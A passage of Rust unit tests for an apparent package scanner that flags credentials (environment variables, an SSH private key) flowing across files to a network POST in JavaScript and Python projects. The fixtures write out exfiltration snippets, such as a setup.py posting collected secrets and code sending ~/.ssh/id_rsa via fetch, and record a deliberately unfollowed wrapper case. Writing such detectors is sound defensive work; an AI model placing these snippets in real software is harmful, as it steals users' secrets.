            ("setup.py", "import requests\nfrom pkg import collect\nrequests.post(URL, json=collect.grab())\n"),
        ] {
            let found = crossing(&[("pkg/collect.py", COLLECT_PY), (path, src)]);
            assert_eq!(found.len(), 1, "{path}: {src} {found:?}");
            assert_eq!(found[0].0, path);
            assert!(
                found[0].2.contains("os.environ in pkg/collect.py (line 4)"),
                "{}",
                found[0].2
            );
        }
        // A function of the package's `__init__`.
        let init = [
            ("pkg/__init__.py", COLLECT_PY),
            (
                "pkg/run.py",
                "import requests\nfrom . import grab\nrequests.post(URL, json=grab())\n",
            ),
        ];
        assert_eq!(crossing(&init).len(), 1);
    }

    #[test]
    fn a_secret_handed_to_an_imported_wrapper_is_not_followed() {
        // Measured and dropped (ruleset 2026.11.16): an agent runtime hands
        // its environment to the session host it starts through a wrapper
        // in another file, and four of its releases were flagged.
        let net = "function send(tag, data) {\n  return fetch(URL + tag, { method: 'POST', body: data });\n}\nmodule.exports = { send };\n";
        let js = "const net = require('./lib/net');\nconst key = fs.readFileSync(path.join(os.homedir(), '.ssh', 'id_rsa'), 'utf8');\nnet.send('k', key);\n";
        assert!(crossing(&[("lib/net.js", net), ("index.js", js)]).is_empty());
        let net = "import requests\n\ndef send(data):\n    requests.post(URL, json=data)\n";
        let py = "import os\nfrom .net import send\nsend(dict(os.environ))\n";
        assert!(crossing(&[("pkg/net.py", net), ("pkg/__init__.py", py)]).is_empty());
    }

    #[test]
    fn an_import_without_a_flow_is_no_finding() {
        let collect = ("lib/collect.js", COLLECT_JS);
        for (path, src) in [
            // The secret is used here and something else is sent.
            ("index.js", "const c = require('./lib/collect');\nconst data = c.all();\nfs.writeFileSync(out, JSON.stringify(data));\nfetch(URL, { method: 'POST', body: JSON.stringify({ ok: true }) });\n"),
            // A package of that name, not the file.
            ("index.js", "const c = require('collect');\nfetch(URL, { method: 'POST', body: JSON.stringify(c.all()) });\n"),
            ("lib/index.js", "import { all } from 'collect';\nfetch(URL, { method: 'POST', body: JSON.stringify(all()) });\n"),
            // Another function of the file, a path above the root, a member
            // of a member.
            ("index.js", "const { other } = require('./lib/collect');\nfetch(URL, { method: 'POST', body: JSON.stringify(other()) });\n"),
            ("index.js", "const c = require('../lib/collect');\nfetch(URL, { method: 'POST', body: JSON.stringify(c.all()) });\n"),
            ("index.js", "const { all } = require('./lib/collect').tools;\nfetch(URL, { method: 'POST', body: JSON.stringify(all()) });\n"),
            // One setting of what came back.
            ("index.js", "const c = require('./lib/env');\nfetch(c.getEnv().API_URL + '/health');\n"),
            ("index.js", "const { getEnv } = require('./lib/env');\nconst base = baseUrl(getEnv());\nfetch(base + '/health');\n"),
            ("index.js", "const { getEnv } = require('./lib/env');\nconst env = getEnv();\nfetch(env.API_URL, { headers: { auth: env['TOKEN'] } });\n"),
            // A function here that passes the secret on is a second level.
            ("index.js", "const c = require('./lib/collect');\nfunction relay() {\n  return c.all();\n}\nfetch(URL, { method: 'POST', body: JSON.stringify(relay()) });\n"),
        ] {
            let env = "function getEnv() {\n  return process.env;\n}\nmodule.exports = { getEnv };\n";
            let files = [collect, ("collect.js", COLLECT_JS), ("lib/env.js", env), (path, src)];
            let found = crossing(&files);
            assert!(found.is_empty(), "{src}: {found:?}");
        }
        // The whole of what `getEnv` returned still counts.
        let whole = "const { getEnv } = require('./lib/env');\nfetch(URL, { method: 'POST', body: JSON.stringify(getEnv()) });\n";
        let env = "function getEnv() {\n  return process.env;\n}\nmodule.exports = { getEnv };\n";
        assert_eq!(
            crossing(&[("lib/env.js", env), ("index.js", whole)]).len(),
            1
        );
        // A function of the same name that returns no secret, and settings
        // read from the environment one by one.
        let index = "const c = require('./lib/collect');\nconst config = require('./config');\nfetch(`http://${config.host}:${config.port}/hook`, { method: 'POST', body: JSON.stringify(c.all()) });\nfetch(config.load().url, { method: 'POST', body: JSON.stringify(config.load()) });\n";
        let files = [
            ("lib/collect.js", "function all() {\n  return { name: pkg.name, version: pkg.version };\n}\nmodule.exports = { all };\n"),
            ("config.js", "function load() {\n  return { port: process.env.PORT, url: process.env.API_URL || 'https://example.com' };\n}\nmodule.exports = { port: process.env.PORT, host: process.env.HOST, load };\n"),
            ("index.js", index),
        ];
        assert!(crossing(&files).is_empty(), "{:?}", crossing(&files));
        // What the imported file imports is not followed.
        let files = [
            collect,
            ("lib/relay.js", "const c = require('./collect');\nfunction relay() {\n  return c.all();\n}\nmodule.exports = { relay, all: c.all };\n"),
            ("index.js", "const r = require('./lib/relay');\nfetch(URL, { method: 'POST', body: JSON.stringify([r.relay(), r.all()]) });\n"),
        ];
        assert!(crossing(&files).is_empty(), "{:?}", crossing(&files));
        // A flow inside the importing file is `flows`' finding, reported once.
        let own = "const c = require('./lib/collect');\nfetch(URL, { method: 'POST', body: JSON.stringify(process.env) });\nfetch(URL, { method: 'POST', body: JSON.stringify(c.all()) });\n";
        assert!(crossing(&[collect, ("index.js", own)]).is_empty());
        assert_eq!(names("index.js", own), vec![CREDENTIAL_EXFIL]);
        // An imported file that is not read (too large, not scanned).
        let index = "const c = require('./lib/collect');\nfetch(URL, { method: 'POST', body: JSON.stringify(c.all()) });\n";
        let found = cross_file(&["lib/collect.js", "index.js"], |path| {
            (path == "index.js").then(|| index.to_string())
        });
        assert!(found.is_empty());
        // Python: a module of another package, and the secret not sent.
        for src in [
            "import requests\nfrom other.collect import grab\nrequests.post(URL, json=grab())\n",
            "import requests\nfrom ...collect import grab\nrequests.post(URL, json=grab())\n",
            "import requests\nfrom .collect import grab\nenv = grab()\nsubprocess.run(cmd, env=env)\nrequests.post(URL, json={'ok': True})\n",
            "import requests\nfrom .collect import grab\nrequests.post(grab().get('API_URL'), json={'ok': True})\n",
        ] {
            let found = crossing(&[("pkg/collect.py", COLLECT_PY), ("pkg/main.py", src)]);
            assert!(found.is_empty(), "{src}: {found:?}");
        }
    }
}
